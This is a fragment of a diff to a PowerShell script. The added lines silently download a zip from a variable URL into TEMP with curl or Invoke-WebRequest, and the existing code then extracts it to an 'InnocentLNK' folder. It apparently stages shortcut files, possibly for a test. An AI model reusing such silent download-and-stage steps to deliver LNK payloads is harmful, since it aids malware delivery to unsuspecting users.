@@ -115,6 +115,12 @@ try {
     $innocentZipPath = Join-Path $env:TEMP $innocentZipName
     $extractedInnocent = "$env:TEMP\InnocentLNK"
 
+    if ($curl) {
+        curl.exe -s -S -L --retry 10 --retry-delay 5 -o $innocentZipPath $innocentZip
+    } else {
+        Invoke-WebRequest -Uri $innocentZip -OutFile $innocentZipPath -ErrorAction Stop
+    }
+
     Expand-Archive -Path $innocentZipPath -DestinationPath $extractedInnocent -Force
 
     if (Test-Path $unzipDir) {
